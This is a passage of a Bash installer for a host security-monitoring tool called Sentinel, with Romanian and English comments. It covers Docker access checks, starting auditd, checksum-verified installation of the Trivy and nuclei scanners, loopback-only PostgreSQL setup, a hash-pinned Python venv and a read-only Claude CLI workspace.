        return 0
    fi
    why="${DOCKER_PROBE_ERR:-$why}"

    # Nu ajungem la daemon ca `sentinel`. Două cauze foarte diferite, despărțite
    # de o a doua întrebare, pusă lui root: dacă nici root nu primește o versiune
    # de server, daemonul e mut pentru toată lumea și refuzul nu e despre
    # apartenență.
    local unaskable=0 daemon_silent=0
    if (( rc == 2 )); then
        unaskable=1
    elif ! docker_server_version_as root; then
        daemon_silent=1
    fi

    if sentinel_in_docker_group && (( unaskable || daemon_silent )); then
        DOCKER_ACCESS_STATE=unproven
        SCAN_CONTAINERS=true
        warn "apartenența lui ${SENTINEL_USER} la grupul ${DOCKER_GROUP} e în /etc/group, \
dar EFECTUL nu a putut fi dovedit: ${why}"
        if (( daemon_silent )); then
            warn "daemonul docker nu răspunde nici lui root, deci refuzul nu e despre \
apartenență. Pornește-l  (systemctl status docker)  și uită-te apoi la cheia \
scan:last:trivy_image."
        else
            warn "nu există nici runuser, nici sudo pe gazda asta, deci nu am cum să rulez \
docker CA ${SENTINEL_USER}. Verifică tu:  runuser -u ${SENTINEL_USER} -- docker version \
--format '{{.Server.Version}}'"
        fi
        warn "scan.containers rămâne true fiindcă intrarea din /etc/group e o dovadă a CĂII \
de acces — dar nu e o dovadă a efectului. Dacă daemonul rămâne mut, scanerul scrie un rând \
failed în fiecare noapte și cheia scan:last:trivy_image se face roșie."
        return 0
    fi

    DOCKER_ACCESS_STATE=denied
    SCAN_CONTAINERS=false
    warn "docker e pe gazda asta, dar ${SENTINEL_USER} NU ajunge la daemon: ${why}"
    if ! getent group "$DOCKER_GROUP" >/dev/null; then
        warn "cauza vizibilă: grupul ${DOCKER_GROUP} nu există. Un client docker care e de \
fapt un înveliș peste podman arată exact așa, și acolo apartenența n-are ce să acorde."
    elif ! sentinel_in_docker_group; then
        warn "cauza vizibilă: după usermod -aG, id -nG ${SENTINEL_USER} tot nu arată \
${DOCKER_GROUP}."
    else
        warn "cauza vizibilă: root primește un răspuns de la daemon și ${SENTINEL_USER} nu \
— apartenența e scrisă, dar socketul o refuză oricum."
    fi
    warn "De asta scan.containers se scrie FALSE, și nu e o preferință: un true fără acces \
ar produce un rând failed în fiecare noapte, iar scanerul nu poate să-și acorde singur \
apartenența."
    if [[ "$wanted" == "true" ]]; then
        warn "ATENȚIE: ${SENTINEL_CONFIG_DIR}/sentinel.yaml de pe gazdă are DEJA \
scan.containers: true, iar install_config nu rescrie un fișier viu — scrie sentinel.yaml.new \
lângă el. Până schimbi valoarea cu mâna, scanarea containerelor eșuează în fiecare noapte."
    fi
}

# --- 20 -------------------------------------------------------------------
# The path the collector opens, and the one named in sentinel.yaml.tmpl. One
# constant, so the check that decides `ingest.auditd` and the file the collector
# reads cannot drift apart without somebody noticing.
AUDITD_LOG_PATH=/var/log/audit/audit.log

# Where step 37 drops the rules file. A variable for the same reason as the
# path above: so the step that installs and verifies it can be run somewhere
# that is not /etc.
AUDITD_RULES_DEST=/etc/audit/rules.d/sentinel.rules

# auditd installed is not auditd running, and only the running one produces
# anything.
#
# Measured on Ubuntu 24.04.4 right after the package went in: systemd reported
# auditd.service as `enabled`, `systemctl is-active auditd` said `inactive`, and
# /var/log/audit was EMPTY. Debian's postinst enables the unit without starting
# it. Left like that, the host has the package, gets the rules written at step
# 37, and collects nothing at all until somebody reboots it — which is the same
# outcome as not installing auditd, reached by a longer route.
#
# `enable --now`, not `restart`: on every host where auditd is already up — all
# the RHEL ones — a restart would be a change to a service that was fine, and
# auditd is not a service one bounces for no reason. And then the EFFECT is what
# is checked: the daemon is active AND the log file has appeared. The file does
# not exist the instant the unit starts, so it is waited for rather than
# assumed; an instant check would report a working auditd as broken.
AUDITD_LOG_WAIT_S=10

ensure_auditd_running() {
    have auditctl || return 1
    if ! systemctl is-active --quiet auditd 2>/dev/null; then
        systemctl enable --now auditd >/dev/null 2>&1 || true
    fi
    systemctl is-active --quiet auditd 2>/dev/null || return 1

    local waited=0
    while (( waited < AUDITD_LOG_WAIT_S )); do
        [[ -f "$AUDITD_LOG_PATH" ]] && return 0
        sleep 1; waited=$((waited + 1))
    done
    return 1
}

# Can this interpreter build Sentinel's venv, and compile against its headers?
#
# Two facts, asked of the interpreter itself rather than of dpkg or rpm:
#
#   ensurepip importable   `python -m venv` fails without it, with
#                          "ensurepip is not available" — step 23
#   Python.h readable      systemd-python==235 is a C extension built at pip
#                          time; without headers step 23 dies in a compiler
#
# Neither is a claim about a package name, which is what makes this survive the
# next distribution to split its Python differently.
python_can_venv() { "$1" -c 'import ensurepip' >/dev/null 2>&1; }

python_has_headers() {
    local inc
    inc="$("$1" -c 'import sysconfig; print(sysconfig.get_paths()["include"])' 2>/dev/null)" || return 1
    [[ -n "$inc" && -r "${inc}/Python.h" ]]
}

# Install what is missing, then ASK AGAIN.
#
# The old code installed the Python group only when python_find failed. On
# Ubuntu 24.04 python3 is 3.12.3, which clears the 3.10 floor, so the block was
# skipped entirely and python3.12-venv / python3.12-dev were never installed —
# measured: `dpkg -l` reported both as `un`. The install then died 200 lines
# later at step 23 with an error about the venv, which is the symptom, not the
# cause. RHEL never saw it because AlmaLinux's python3 is 3.9, below the floor,
# so the block always ran there.
#
# Driven by the two facts and not by the family: on a host where both already
# hold — every RHEL host that installs today — nothing is installed and nothing
# changes. The package install itself is best-effort on purpose; whether it
# worked is decided by re-asking the interpreter, not by apt's exit code.
ensure_python_build_deps() {
    local py="$1" missing=() pkgs=() p
    python_can_venv "$py"    || missing+=("venv")
    python_has_headers "$py" || missing+=("headers")
    if (( ${#missing[@]} == 0 )); then
        ok "${py} already has venv and headers"
        return 0
    fi

    while read -r p; do pkgs+=("$p"); done < <(python_support_pkgs "$py")
    if (( ${#pkgs[@]} )); then
        local what
        what="$(printf '%s and ' "${missing[@]}")"; what="${what% and }"
        info "${py} is missing ${what}; installing ${pkgs[*]}"
        pkg_install "${pkgs[@]}" >/dev/null 2>&1 || \
            warn "installing ${pkgs[*]} reported a failure; checking what is on the host anyway"
    else
        warn "${py} would not say which version it is, so there are no package \
names to install for it"
    fi

    missing=()
    python_can_venv "$py"    || missing+=("ensurepip — '${py} -m venv' will fail")
    python_has_headers "$py" || missing+=("Python.h — systemd-python will not compile")
    if (( ${#missing[@]} )); then
        die "${py} still cannot build Sentinel's venv:
    $(printf '%s\n    ' "${missing[@]}")
    Install ${pkgs[*]-the venv and development packages for ${py}} by hand and re-run."
    fi
    ok "${py} can build a venv and has its headers"
}

step_packages() {
    # Recorded BEFORE the install, because it decides whether nginx.conf is ours
    # to edit later. If nginx was already serving the operator's sites, its
    # config belongs to them.
    #
    # Write-once, and that is the repair. The observation below is only
    # meaningful the FIRST time it is made: from the second deploy on,
    # `pkg_installed nginx` is true because WE installed it. A step 20 that ran
    # again — --force-step 20, --from-step 20, or a reinstall — used to append
    # NGINX_WAS_PREEXISTING=1 to preflight.env about our own package;
    # resolve_config sourced that on every later run, and step 33 then spent
    # every deploy printing "Not touching nginx.conf — it is yours" about a file
    # this installer had written.
    local observed=0
    if pkg_installed nginx || systemctl is-active --quiet nginx 2>/dev/null; then
        observed=1
    fi
    NGINX_WAS_PREEXISTING="$(fact_record_once "$NGINX_PREEXISTING_FACT" "$observed")"
    if [[ "$NGINX_WAS_PREEXISTING" == "1" ]]; then
        info "nginx was on this host before Sentinel — its configuration will not be modified"
    elif (( observed )); then
        info "nginx is installed, but the first deploy recorded that it was NOT \
here before us. The package is ours, so step 33 may take its :80 listener out \
of service."
    fi

    info "installing base packages on ${DISTRO_PRETTY} (a few minutes on a fresh host)"
    pkg_refresh
    pkg_enable_extra_repos || warn "extra repositories unavailable; Suricata may be missing"

    # An interpreter first: everything else is easier once we know which one.
    # The names differ per family, so try each candidate set until one resolves.
    if ! python_find >/dev/null; then
        local group installed=0
        while read -r group; do
            # shellcheck disable=SC2086
            if pkg_install $group >/dev/null 2>&1; then installed=1; break; fi
        done < <(python_pkg_names)
        (( installed )) || die "could not install a Python >= 3.${PYTHON_MIN_MINOR}"
    fi
    PYTHON_BIN="$(python_find)" || die "no Python >= 3.${PYTHON_MIN_MINOR} after install"
    printf 'PYTHON_BIN=%q\n' "$PYTHON_BIN" >> "${STATE_MARKERS}/preflight.env"
    info "using ${PYTHON_BIN} ($("$PYTHON_BIN" -V 2>&1))"

    # An interpreter that exists is not an interpreter that can build the venv.
    ensure_python_build_deps "$PYTHON_BIN"

    # Shared roles, per-family names. `systemd-devel` / `libsystemd-dev` matter
    # most: systemd-python is a C extension built at pip time, and without the
    # headers the venv step dies with "Package 'libsystemd' ... not found".
    local pkgs=()
    while read -r p; do pkgs+=("$p"); done < <(pkg_names_core)
    pkg_install "${pkgs[@]}" || die "package installation failed"

    # auditd is where every host.* detection comes from. Not fatal — Sentinel
    # still watches journald, nginx and Suricata without it — but never silent:
    # a host with no auditd is a host with a whole class of detection missing,
    # and step 26 writes that fact into the configuration instead of pretending.
    if ! have auditctl; then
        warn "auditd is not installed on this host. Every host.* detection, plus \
auth.new_user and auth.new_ssh_key, comes from it and will not fire."
    elif ensure_auditd_running; then
        ok "auditd running and writing ${AUDITD_LOG_PATH}"
    else
        warn "auditd is installed but ${AUDITD_LOG_PATH} is not being written \
(service state: $(systemctl is-active auditd 2>/dev/null || echo unknown)). The rules \
installed at step 37 will load into the kernel and nothing will collect their records. \
Inspect with:  systemctl status auditd"
    fi

    # Optional extras: a missing one degrades a feature, it does not stop setup.
    pkg_install git certbot >/dev/null 2>&1 || \
        warn "git/certbot unavailable; TLS issuance may need doing by hand"
    if [[ "$DISTRO_FAMILY" == "rhel" ]]; then
        pkg_install policycoreutils-python-utils >/dev/null 2>&1 || true
    fi

    pg_bootstrap || die "PostgreSQL install failed"
    ok "base packages installed"
}

# --- 21 -------------------------------------------------------------------
# How long a freshly installed tool gets to answer ONE version query. There is a
# ceiling because `nuclei -version` also asks projectdiscovery whether a newer
# release exists: on a host with no route out, an unbounded probe would hang the
# installer here rather than report anything.
#
# The window per TOOL is three times this constant, not this constant:
# tool_version_line tries --version, then -version, then version, and each
# attempt carries its own `timeout`. A binary that hangs on all three therefore
# costs 3 x 20 = 60 seconds, and the two-tool manifest can spend two minutes
# here before the step says a word. Measured against a binary that sleeps, with
# TOOL_PROBE_TIMEOUT_S=2: 6.6 seconds for one tool. The window is accepted as it
# stands; what was wrong was this comment, which named 20 — the wrong number to
# give an operator wondering how long a silent step is allowed to stay silent.
TOOL_PROBE_TIMEOUT_S=20

# Where external binaries land. A defaulted variable rather than a bare
# literal, in the same shape as SENTINEL_PREFIX and friends in lib/common.sh,
# so tests/security/test_installer_external_tools.py can run the SHIPPED step
# against a temporary directory instead of the machine's real /usr/local/bin.
# Nothing in the installer or in deploy.sh ever sets it; a test pins the
# default so it cannot drift.
TOOLS_BIN_DIR="${TOOLS_BIN_DIR:-/usr/local/bin}"

# Proof that the binary RUNS on this host — not that a file with that name
# exists, which is a different and much weaker claim. An amd64 build on arm64
# exits 126, a truncated file exits 126 or 2, and a directory left behind by a
# failed unpack is not executable at all. None of those reach exit 0 with output.
#
# The flag differs per tool (cobra wants --version, goflags wants -version), so
# each is tried in turn. Output is captured with 2>&1 on purpose: nuclei prints
# its banner and its version line to stderr. With 2>/dev/null nuclei's probe
# would look empty and a perfectly good install would be reported as unproven.
tool_version_line() {
    local bin="$1" flag out ver
    for flag in --version -version version; do
        out="$(timeout "$TOOL_PROBE_TIMEOUT_S" "$bin" "$flag" 2>&1)" || continue
        [[ -n "$out" ]] || continue
        # The version number wherever it sits in the output: trivy answers with
        # one plain line, nuclei with an ASCII banner ahead of it.
        ver="$(printf '%s\n' "$out" | tr -d '\r' | grep -m1 -oE '[0-9]+\.[0-9]+\.[0-9]+[A-Za-z0-9.+-]*' || true)"
        [[ -n "$ver" ]] || ver="$(printf '%s\n' "$out" | tr -d '\r' | head -1)"
        printf '%s' "$ver"
        return 0
    done
    return 1
}

# The archive format is read from the first bytes of the file, not from the URL:
# once the checksum has matched we know exactly which bytes we hold, and the
# bytes are the truth about them. This matters because trivy publishes .tar.gz
# while nuclei publishes ONLY .zip for Linux (linux_386, linux_amd64, linux_arm,
# linux_arm64 — there is no tar.gz), so a step that only knows tar could never
# install nuclei at all.
tool_archive_kind() {
    local f="$1" magic
    magic="$(od -An -N4 -tx1 < "$f" 2>/dev/null | tr -d ' \n')"
    case "$magic" in
        1f8b*)                      printf 'gzip' ;;
        504b0304|504b0506|504b0708) printf 'zip' ;;
        *)                          return 1 ;;
    esac
}

# Unpacks into a staging directory, never straight into /usr/local/bin: these
# archives also carry LICENSE and README, and the old fallback
# `tar -xzf -C /usr/local/bin` sprayed them there whenever the targeted
# extraction missed.
tool_extract() {
    local archive="$1" dest="$2" kind
    kind="$(tool_archive_kind "$archive")" || return 1
    case "$kind" in
        gzip)
            tar -xzf "$archive" -C "$dest"
            ;;
        zip)
            # `unzip` is NOT in pkg_names_core (deploy/lib/distro.sh), so on a
            # minimal host it may simply not be there. It was not added to that
            # list because pkg_install of the core set is a `die` path, and a
            # package missing from one repository would then stop the whole
            # install over a zip reader. Python is the guaranteed fallback
            # instead: step 20 dies unless it can produce a Python >= 3.x, and
            # records it in PYTHON_BIN. bsdtar was not used — it is guaranteed
            # on neither family (own package on RHEL, libarchive-tools on Debian).
            #
            # `python -m zipfile` drops the executable bit. Harmless here,
            # because `install -m 0755` below sets it — and, unlike the version
            # this replaces, the result is then actually verified.
            if have unzip; then
                unzip -q -o "$archive" -d "$dest"
            elif [[ -n "${PYTHON_BIN:-}" ]] && "$PYTHON_BIN" -c 'import zipfile' 2>/dev/null; then
                "$PYTHON_BIN" -m zipfile -e "$archive" "$dest"
            elif have python3 && python3 -c 'import zipfile' 2>/dev/null; then
                python3 -m zipfile -e "$archive" "$dest"
            else
                return 1
            fi
            ;;
    esac
}

# Skipping a tool that is already on PATH is right: one put there by the
# operator or by the distribution is not ours to overwrite. What was wrong was
# the old report of it — `ok "${name} already installed"` — which let the
# operator believe the pinned version was the one on the host. It can be any
# other, and an old scanner reports fewer findings without ever complaining.
# So say what is actually there, and say when it differs from what is pinned.
#
# Returns 0 only when the tool on PATH was proved to BE the pinned version.
# Anything else — a different version, or one that would not say — returns 1,
# so the caller counts it as unproven and the step's closing line cannot go
# green over it. "Present" and "the version we reviewed" are not the same claim.
tool_report_existing() {
    local name="$1" url="$2" path found pinned=""
    path="$(command -v "$name")"
    # The pinned version, read out of the URL: GitHub releases are
    # .../download/vX.Y.Z/<asset>. If a URL ever stops looking like that we
    # simply do not claim to know, rather than guessing.
    if [[ "$url" == */download/*/* ]]; then
        pinned="${url##*/download/}"; pinned="${pinned%%/*}"; pinned="${pinned#v}"
    fi
    if ! found="$(tool_version_line "$path")"; then
        warn "${name} is already on PATH at ${path}, but it did not answer a version \
query — Sentinel cannot tell which build it is. Left alone; verify it by hand."
        return 1
    fi
    # Equality, not `*"$pinned"*`. The substring test reported a host as being
    # at the pinned version whenever the pin was a PREFIX of what is installed:
    # nuclei is on 3.11.x today, so a host carrying 3.11.10 against a manifest
    # pinning 3.11.1 was announced as "already installed" at the pinned build.
    # An unreviewed scanner, reported as the reviewed one — the exact claim this
    # function was added to stop making, and one patch release away from real.
    #
    # `found` is already a bare version token in every case that can be proved:
    # tool_version_line greps `X.Y.Z...` out of the output and only falls back
    # to a whole line when there is no version in it at all. In that fallback
    # nothing can be proved, and equality correctly refuses to claim otherwise.
    # A build answering `0.74.0-dev` against a pin of `0.74.0` is refused for
    # the same reason: it is not the build whose checksum sits in the manifest.
    if [[ -n "$pinned" && "$found" != "$pinned" ]]; then
        warn "${name} on PATH at ${path} reports ${found}, but the manifest pins \
${pinned}. Left alone — remove it and re-run step 21 to get the pinned build."
        return 1
    fi
    ok "${name} already installed at ${path}: ${found}"
}

step_external_tools() {
    # Never `curl | bash`. Every external binary is downloaded, checksummed
    # against a pinned value, and only then installed — a security tool that
    # pipes the internet into a shell has no business auditing anything.
    #
    # And, just as important: nothing is reported as installed because an unpack
    # command returned 0. What shipped here wrote `ok "${name} installed"`
    # unconditionally, after two tar attempts that could BOTH fail, with the
    # chmod that would have caught it neutralised by `|| true`. Nothing in the
    # step ever looked at /usr/local/bin. That is the CLAUDE.md pattern —
    # confirming the intention instead of the effect — sitting inside the step
    # that installs the security tooling. What is checked now: the file is at
    # the destination, it is executable, and it answers a version query here.
    #
    # The step stays tolerant: a release that 404s, an unreadable archive or a
    # binary for the wrong architecture must not stop an install that is mostly
    # about auditd, nftables and the database. So none of these paths `die`.
    # They print `[x]`/`[!]` per tool and close with a counted verdict line —
    # a `warn`, because WARN_COUNT is what the end-of-run summary prints (see
    # main()); FAIL_COUNT is incremented and read nowhere.
    local manifest="${SCRIPT_DIR}/tools/manifest.txt"
    if [[ ! -f "$manifest" ]]; then
        warn "no tools manifest at ${manifest}; skipping Trivy/nuclei. \
Vulnerability scanning (P7) will not be available until they are installed."
        return 0
    fi

    local name url sha work tmp src ver
    local n_ok=0 n_present=0 n_unproven=0 n_bad=0
    # `|| [[ -n "$name" ]]` picks up the last line of a manifest saved without a
    # trailing newline: without it `read` returns 1 and that tool is skipped in
    # complete silence, which is the same lie in a new place.
    while read -r name url sha || [[ -n "$name" ]]; do
        [[ -z "$name" || "$name" == \#* ]] && continue
        if [[ -z "$url" || -z "$sha" ]]; then
            fail "manifest entry '${name}' is incomplete (want: <name> <url> <sha256>); NOT installed"
            n_bad=$((n_bad + 1)); continue
        fi

        if have "$name"; then
            if tool_report_existing "$name" "$url"; then
                n_present=$((n_present + 1))
            else
                n_unproven=$((n_unproven + 1))
            fi
            continue
        fi

        # mktemp, not a fixed /tmp/sentinel-<name>.tar.gz: that path was
        # predictable and written as root into a world-writable directory. The
        # extension went with it — it described only one of the two formats.
        work="$(mktemp -d "/tmp/sentinel-tool-${name}.XXXXXX")" || {
            fail "cannot create a staging directory for ${name}; NOT installed"
            n_bad=$((n_bad + 1)); continue
        }
        tmp="${work}/archive"

        info "downloading ${name}"
        if ! curl -fsSL --max-time 120 -o "$tmp" "$url"; then
            rm -rf "$work"
            warn "download failed: ${name}; NOT installed"
            n_bad=$((n_bad + 1)); continue
        fi
        if ! printf '%s  %s\n' "$sha" "$tmp" | sha256sum -c --status; then
            rm -rf "$work"
            fail "checksum mismatch for ${name}. Refusing to install. This is either a \
corrupted download or a compromised mirror — do not work around it."
            n_bad=$((n_bad + 1)); continue
        fi

        if ! tool_extract "$tmp" "$work"; then
            rm -rf "$work"
            fail "could not unpack the ${name} archive — unrecognised format, or no \
extractor for it (a .zip needs unzip or python3). ${name} is NOT installed."
            n_bad=$((n_bad + 1)); continue
        fi

        # The binary wherever the archive put it: at the root for trivy and
        # nuclei, possibly a level down for something else. If it is nowhere,
        # the unpack succeeded and there is still nothing to install — exactly
        # the case the old code reported as `ok`.
        src="$(find "$work" -mindepth 1 -type f -name "$name" -print -quit 2>/dev/null || true)"
        if [[ -z "$src" ]]; then
            rm -rf "$work"
            fail "the ${name} archive unpacked but holds no file named '${name}'; NOT installed"
            n_bad=$((n_bad + 1)); continue
        fi
        # -D so a host without /usr/local/bin gets it rather than a failure that
        # would read like a broken archive.
        if ! install -D -m 0755 "$src" "${TOOLS_BIN_DIR}/${name}"; then
            rm -rf "$work"
            fail "could not write ${TOOLS_BIN_DIR}/${name}; NOT installed"
            n_bad=$((n_bad + 1)); continue
        fi
        rm -rf "$work"

        # Everything from here down is the effect, not the intention.
        if [[ ! -x "${TOOLS_BIN_DIR}/${name}" ]]; then
            fail "${TOOLS_BIN_DIR}/${name} is not executable after install; ${name} is NOT usable"
            n_bad=$((n_bad + 1)); continue
        fi
        if ver="$(tool_version_line "${TOOLS_BIN_DIR}/${name}")"; then
            ok "${name} installed: ${ver} (${TOOLS_BIN_DIR}/${name})"
            n_ok=$((n_ok + 1))
        else
            # Left on disk deliberately. Deleting on an ambiguous probe would be
            # destructive on doubt, and a re-run reports the same thing again
            # through tool_report_existing rather than pretending it is fine.
            warn "${name} was written to ${TOOLS_BIN_DIR}/${name} but does not run here \
— no answer to a version query. Wrong architecture, or a missing shared library. \
Treat it as NOT installed; vulnerability scanning will not use it."
            n_bad=$((n_bad + 1))
        fi
    done < "$manifest"

    # Green only when every tool in the manifest was proved to be on the host at
    # the pinned version. An unproven one counts against the verdict too: this
    # line is the last thing about step 21 the operator reads, and a green one
    # over a scanner nobody could identify is the whole failure mode again.
    #
    # And "every tool" is vacuously true over no tools at all. A manifest that
    # holds only comments, or zero bytes, walks the loop zero times, leaves all
    # four counters at 0, and used to close with
    # `[+] external tools: 0 installed, 0 already present` — after which
    # run_step wrote the 21_external_tools marker, so every later run printed
    # "already done" and the operator never saw the step again. That is the
    # defect the manifest's own header records for 10 August 2026, one door
    # further along: the MISSING file was handled, the empty one was not.
    # Proving nothing is not proving everything.
    local n_seen=$((n_ok + n_present + n_unproven + n_bad))
    if (( n_seen == 0 )); then
        warn "the tools manifest at ${manifest} pins no tools, so step 21 \
installed nothing. Vulnerability scanning (P7) has no scanners until Trivy and \
nuclei are listed there — the file is present but holds no entry."
    # `n_ok + n_present == 0` cannot be true here as the counters stand today.
    # n_seen is those two plus n_unproven and n_bad, so once n_seen is non-zero
    # and neither of the other two is, the first two cannot both be zero. The
    # clause is unfalsifiable: no test can make it decide anything, and none
    # does. That is a real objection and it is not being waved away.
    #
    # It stays, and this comment is the whole of why. The scenario it is
    # written for is a FIFTH counter added to n_seen but not to the warn below
    # — a tool the loop skipped, say. In that world the `n_seen == 0` branch
    # stops firing for a manifest that proved nothing, and this clause is the
    # only thing left between that manifest and a green line. It fires with the
    # wrong words when it does: all four numbers read 0 and "see the lines
    # above" points at nothing. But a warn with an incomplete message is a
    # thing the operator goes and looks at, while
    # `ok: 0 installed, 0 already present` over a step that proved nothing is
    # the exact lie step 21 was rewritten to stop telling — the same shape as
    # loading audit rules with the kernel's complaint sent to /dev/null.
    #
    # So, to whoever adds the fifth counter: add it to the warn below too, not
    # only to n_seen. Carrying that sentence to you is what this clause is for.
    elif (( n_bad > 0 || n_unproven > 0 || n_ok + n_present == 0 )); then
        warn "external tools: ${n_ok} installed, ${n_present} already present at the \
pinned version, ${n_unproven} present but unverified, ${n_bad} NOT installed. \
Vulnerability coverage is not proven for those — see the lines above."
    else
        ok "external tools: ${n_ok} installed, ${n_present} already present"
    fi
}

# --- 22 -------------------------------------------------------------------
step_postgres() {
    # RHEL keeps configuration inside the data directory; Debian splits it
    # into /etc/postgresql/<version>/main and initialises the cluster in its
    # postinst, so there is nothing to initdb there.
    local pgconf; pgconf="$(pg_confdir)"
    [[ -d "$pgconf" ]] || die "PostgreSQL config directory not found at ${pgconf}"

    install -D -m 0644 -o postgres -g postgres \
        "${SCRIPT_DIR}/postgres/sentinel-tuning.conf" \
        "${pgconf}/conf.d/sentinel-tuning.conf"
    grep -q "include_dir 'conf.d'" "${pgconf}/postgresql.conf" || \
        echo "include_dir = 'conf.d'" >> "${pgconf}/postgresql.conf"

    # Loopback only, scram-sha-256. The database is never reachable off-host.
    #
    # These rules are INSERTED before the distribution defaults, not appended.
    # pg_hba is first-match-wins, and AlmaLinux ships a broad
    # `host all all 127.0.0.1/32 ident` line. Appended after it, our scram rules
    # would never be reached and every connection as `sentinel` would fail with
    # "Ident authentication failed" — which is exactly what happened. The guard
    # matches our actual rule so a re-run is idempotent regardless of position.
    local hba="${pgconf}/pg_hba.conf"
    if ! grep -qE '^[[:space:]]*host[[:space:]]+sentinel[[:space:]]+sentinel[[:space:]]+127' "$hba"; then
        local hba_tmp; hba_tmp="$(mktemp)"
        awk -v snip="${SCRIPT_DIR}/postgres/pg_hba.snippet" '
            !ins && /^[[:space:]]*(local|host|hostssl|hostnossl)[[:space:]]/ {
                while ((getline line < snip) > 0) print line
                close(snip); ins = 1
            }
            { print }
            END { if (!ins) { while ((getline line < snip) > 0) print line } }
        ' "$hba" > "$hba_tmp"
        install -m 0600 -o postgres -g postgres "$hba_tmp" "$hba"
        rm -f "$hba_tmp"
        ok "pg_hba.conf updated (sentinel scram rules before the defaults)"
    fi

    systemctl enable --now postgresql
    sleep 2

    local db_password="${SECRETS[SENTINEL_DB_PASSWORD]:-}"
    [[ -z "$db_password" ]] && die "SENTINEL_DB_PASSWORD was not supplied on stdin"

    # The statement is fed on stdin, NOT via -c. psql only interpolates :'pw' for
    # input read from stdin or a file; with -c it treats the string as
    # server-parsable SQL and passes :'pw' through literally, which the server
    # then rejects with "syntax error at or near :". stdin keeps the password off
    # any command line where `ps` could show it, which was the point of :'pw'.
    if ! sudo -u postgres psql -tAc "SELECT 1 FROM pg_roles WHERE rolname='sentinel'" | grep -q 1; then
        printf "CREATE ROLE sentinel LOGIN PASSWORD :'pw';\n" \
            | sudo -u postgres psql -v ON_ERROR_STOP=1 -v pw="$db_password" >/dev/null
        ok "role sentinel created"
    else
        printf "ALTER ROLE sentinel PASSWORD :'pw';\n" \
            | sudo -u postgres psql -v ON_ERROR_STOP=1 -v pw="$db_password" >/dev/null
        ok "role sentinel password updated"
    fi

    if ! sudo -u postgres psql -tAc "SELECT 1 FROM pg_database WHERE datname='sentinel'" | grep -q 1; then
        sudo -u postgres createdb -O sentinel sentinel
        ok "database sentinel created"
    fi
    systemctl reload postgresql
}

# --- 23 -------------------------------------------------------------------
step_venv() {
    local py="${PYTHON_BIN:-$(python_find || echo python3)}"
    have "$py" || py=python3

    if [[ ! -x "${SENTINEL_PREFIX}/venv/bin/python" ]]; then
        "$py" -m venv "${SENTINEL_PREFIX}/venv"
        ok "virtualenv created"
    fi
    "${SENTINEL_PREFIX}/venv/bin/pip" install --quiet --upgrade pip wheel

    # Hash-pinned where available: a compromised mirror cannot substitute a
    # package under Sentinel's own privileges.
    if [[ -f "${SRC_ROOT}/requirements-lock.txt" ]]; then
        "${SENTINEL_PREFIX}/venv/bin/pip" install --quiet \
            --require-hashes -r "${SRC_ROOT}/requirements-lock.txt" \
            || die "pip install (hash-pinned) failed"
        ok "dependencies installed from the hash-pinned lockfile"
    else
        warn "requirements-lock.txt is absent; installing from requirements.txt \
without hash verification. Generate the lock with pip-compile --generate-hashes."
        "${SENTINEL_PREFIX}/venv/bin/pip" install --quiet -r "${SRC_ROOT}/requirements.txt" \
            || die "pip install failed"
    fi
}

# --- 24 -------------------------------------------------------------------
step_package() {
    rm -rf "${SENTINEL_PREFIX}/lib/sentinel"
    install -d -m 0755 "${SENTINEL_PREFIX}/lib"
    cp -r "${SRC_ROOT}/sentinel" "${SENTINEL_PREFIX}/lib/sentinel"
    cp "${SRC_ROOT}/VERSION" "${SENTINEL_PREFIX}/VERSION"
    chown -R root:root "${SENTINEL_PREFIX}/lib"
    find "${SENTINEL_PREFIX}/lib" -type d -exec chmod 0755 {} +
    find "${SENTINEL_PREFIX}/lib" -type f -exec chmod 0644 {} +

    # The executor is the only root component. Root-owned, not writable by the
    # sentinel user, and importing nothing from the main package — so a
    # compromise of sentinel/ cannot reach into it.
    install -D -m 0755 -o root -g root \
        "${SRC_ROOT}/executor/sentinel_executor.py" "${SENTINEL_PREFIX}/libexec/sentinel_executor.py"
    for f in commands.py policy.py; do
        [[ -f "${SRC_ROOT}/executor/${f}" ]] && \
            install -D -m 0644 -o root -g root \
                "${SRC_ROOT}/executor/${f}" "${SENTINEL_PREFIX}/libexec/${f}"
    done

    # Front-end libraries: downloaded with checksum verification, never
    # committed. P1 needs none of them; from P2 the charts do.
    if [[ -x "${SRC_ROOT}/scripts/vendor-assets.sh" ]]; then
        sudo -u "$SENTINEL_USER" "${SRC_ROOT}/scripts/vendor-assets.sh"             2>/dev/null || info "vendored assets not fetched; charts arrive in P2"
    fi

    cat > "${SENTINEL_PREFIX}/bin/sentinel" <<EOF
#!/bin/sh
exec env PYTHONPATH="${SENTINEL_PREFIX}/lib" \\
    "${SENTINEL_PREFIX}/venv/bin/python" -m sentinel "\$@"
EOF
    chmod 0755 "${SENTINEL_PREFIX}/bin/sentinel"
    ln -sf "${SENTINEL_PREFIX}/bin/sentinel" /usr/local/bin/sentinel
    ok "package installed to ${SENTINEL_PREFIX}/lib"
}

# --- 25 -------------------------------------------------------------------
step_claude_workspace() {
    local ws="${SENTINEL_PREFIX}/claude-workspace"
    install -d -m 0755 -o "$SENTINEL_USER" -g "$SENTINEL_USER" "${ws}/.claude"

    # The headless CLI runs with cwd AND HOME set to this directory, so the
    # skill is discovered both as a project skill and as a personal one.
    rm -rf "${ws}/.claude/skills" "${ws}/.claude/agents"
    cp -r "${SRC_ROOT}/.claude/skills" "${ws}/.claude/skills"
    cp -r "${SRC_ROOT}/.claude/agents" "${ws}/.claude/agents"

    # Runtime settings, NOT the developer-machine ones: read-only, plan mode,
    # no network, no writes.
    install -m 0644 "${SCRIPT_DIR}/claude-workspace/settings.json" "${ws}/.claude/settings.json"
    install -m 0644 "${SCRIPT_DIR}/claude-workspace/CLAUDE.md"     "${ws}/CLAUDE.md"

    chown -R "$SENTINEL_USER:$SENTINEL_USER" "$ws"
    find "${ws}/.claude/skills" -name '*.py' -exec chmod 0755 {} +

    ok "Claude workspace installed at ${ws}"
    if ! have claude; then
        info "the claude CLI is not installed. Patch-plan generation and /ask need it; \
API-based triage, correlation and reports do not. Install it later if you want those."
    fi
}

# --- 26 -------------------------------------------------------------------
# Will there be an auditd feeding the collector on this host?
#
# `ingest.auditd: true` used to be hardcoded in the template. On Ubuntu 24.04.4
# auditd is not installed at all — `auditctl` did not exist — so the shipped
# configuration told the collector to read a file that would never be created.
# Nothing failed; the host.* detections and auth.new_user / auth.new_ssh_key
# simply never fired, on a dashboard that reported itself healthy. A
# configuration that lies is worse than a missing package: the missing package
# is at least visible.
#
# Two facts, both about this host and neither about our intent: the control
# binary exists, and the log the template names is actually there. The DAEMON
# being up right now is deliberately NOT one of them — step 26 re-runs on every
